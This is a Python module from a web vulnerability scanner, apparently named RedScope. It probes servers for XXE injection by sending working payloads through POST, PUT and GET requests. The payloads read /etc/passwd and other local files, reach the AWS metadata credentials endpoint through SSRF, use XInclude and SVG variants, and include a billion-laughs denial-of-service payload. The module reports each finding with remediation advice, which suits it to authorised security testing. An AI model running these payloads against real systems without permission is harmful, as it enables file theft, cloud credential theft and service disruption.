import re
from typing import List, Optional

import requests

from core.base_module import BaseModule, ScanResult, Finding

# XXE payloads targeting different parsers and bypass techniques
XXE_PAYLOADS = [
    # Classic file read
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        r"root:.*:0:0:",
        "Classic LFI via XXE",
        "critical",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
        r"[a-zA-Z0-9\-]{2,}",
        "Hostname disclosure via XXE",
        "high",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><root>&xxe;</root>',
        r"\[extensions\]|for 16-bit",
        "Windows file read via XXE",
        "critical",
    ),
    # PHP wrapper
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
        r"[A-Za-z0-9+/]{20,}={0,2}",
        "PHP wrapper base64 file read via XXE",
        "critical",
    ),
    # SSRF via XXE
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        r"ami-id|instance-id|iam|security-credentials",
        "SSRF to AWS metadata via XXE",
        "critical",
    ),
    # Billion laughs (DoS) — send carefully
    (
        '<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><root>&lol3;</root>',
        None,
        "Billion laughs DoS probe",
        "high",
    ),
    # XInclude
    (
        '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>',
        r"root:.*:0:0:",
        "XInclude file read",
        "critical",
    ),
    # SVG XXE (for image upload endpoints)
    (
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
        r"root:.*:0:0:",
        "SVG-based XXE",
        "critical",
    ),
]

CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/soap+xml",
    "image/svg+xml",
]

XML_ENDPOINTS = [
    "/api", "/api/v1", "/api/v2", "/soap", "/xmlrpc", "/xmlrpc.php",
    "/rpc", "/service", "/ws", "/webservice", "/upload", "/import",
    "/parse", "/convert", "/feed", "/rss", "/atom", "/sitemap.xml",
]


class Module(BaseModule):
    name = "xxe"
    description = "XXE detector — file read, SSRF, XInclude, SVG, and PHP wrapper injection"
    author = "RedScope"
    version = "1.0.0"

    def run(self, target: str, **kwargs) -> ScanResult:
        result = ScanResult(module=self.name, target=target)
        url = target if target.startswith("http") else f"https://{target}"
        base = url.rstrip("/")

        session = requests.Session()
        session.headers["User-Agent"] = self.config["general"]["user_agent"]
        timeout = self.config["general"]["timeout"]

        self.log.info(f"XXE scan on [bold]{base}[/]")

        # Discover XML-accepting endpoints
        endpoints = self._discover_endpoints(session, base, timeout)
        self.log.info(f"  Found {len(endpoints)} XML-accepting endpoint(s)")

        if not endpoints:
            self.log.warning("  No XML endpoints found — trying base URL with all content types")
            endpoints = [(base, "application/xml")]

        for endpoint, content_type in endpoints:
            self.log.info(f"  Testing [cyan]{endpoint}[/] ({content_type})")
            for payload, pattern, technique, severity in XXE_PAYLOADS:
                if pattern is None:
                    continue  # Skip DoS payload in automated mode
                finding = self._probe(session, endpoint, payload, pattern, technique, severity, content_type, timeout)
                if finding:
                    result.add_finding(finding)
                    break  # One confirmed XXE per endpoint is enough

        # Check for XML in GET params
        get_finding = self._test_get_xml(session, base, timeout)
        if get_finding:
            result.add_finding(get_finding)

        if not result.findings:
            self.log.info("[dim]No XXE vulnerabilities detected[/]")

        return result

    def _discover_endpoints(self, session, base, timeout) -> List[tuple]:
        found = []
        for path in XML_ENDPOINTS:
            url = f"{base}{path}"
            for ct in CONTENT_TYPES:
                try:
                    resp = session.post(
                        url,
                        data='<?xml version="1.0"?><test/>',
                        headers={"Content-Type": ct},
                        timeout=timeout,
                        verify=False,
                    )
                    if resp.status_code not in (404, 405):
                        found.append((url, ct))
                        self.log.info(f"  [green]XML endpoint:[/] {url} ({ct}) → {resp.status_code}")
                        break
                except requests.RequestException:
                    continue
        return found

    def _probe(self, session, endpoint, payload, pattern, technique, severity, content_type, timeout) -> Optional[Finding]:
        for method in ("POST", "PUT"):
            try:
                resp = getattr(session, method.lower())(
                    endpoint,
                    data=payload,
                    headers={"Content-Type": content_type},
                    timeout=timeout,
                    verify=False,
                )
                if pattern and re.search(pattern, resp.text, re.IGNORECASE):
                    match = re.search(pattern, resp.text, re.IGNORECASE)
                    self.log.info(f"  [bold red]XXE CONFIRMED[/] {technique} via {method}")
                    return Finding(
                        title=f"XXE Injection — {technique}",
                        severity=severity,
                        description=(
                            f"XML External Entity injection confirmed at {endpoint}. "
                            f"Technique: {technique}. "
                            "An attacker can read local files, perform SSRF, or cause denial of service."
                        ),
                        evidence=(
                            f"Endpoint: {endpoint}\n"
                            f"Method: {method}\n"
                            f"Content-Type: {content_type}\n"
                            f"Technique: {technique}\n"
                            f"Pattern matched: {pattern}\n"
                            f"Output: {match.group(0)[:100] if match else ''}"
                        ),
                        remediation=(
                            "Disable external entity processing in your XML parser. "
                            "In Java: factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true). "
                            "In PHP: libxml_disable_entity_loader(true). "
                            "Use a safe XML parser or JSON instead of XML where possible."
                        ),
                        tags=["xxe", "xml", "lfi", "ssrf", "web"],
                    )
            except requests.RequestException:
                continue
        return None

    def _test_get_xml(self, session, base, timeout) -> Optional[Finding]:
        xml_params = ["xml", "data", "input", "body", "payload", "content"]
        simple_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        for param in xml_params:
            try:
                resp = session.get(
                    base,
                    params={param: simple_payload},
                    timeout=timeout,
                    verify=False,
                )
                if re.search(r"root:.*:0:0:", resp.text):
                    return Finding(
                        title=f"XXE via GET Parameter: {param}",
                        severity="critical",
                        description=f"XXE injection via GET parameter '{param}' — server parsed XML from query string.",
                        evidence=f"URL: {base}?{param}=<xxe_payload>",
                        remediation="Disable external entity processing and never parse untrusted XML from GET params.",
                        tags=["xxe", "get", "lfi"],
                    )
            except requests.RequestException:
                continue
        return None
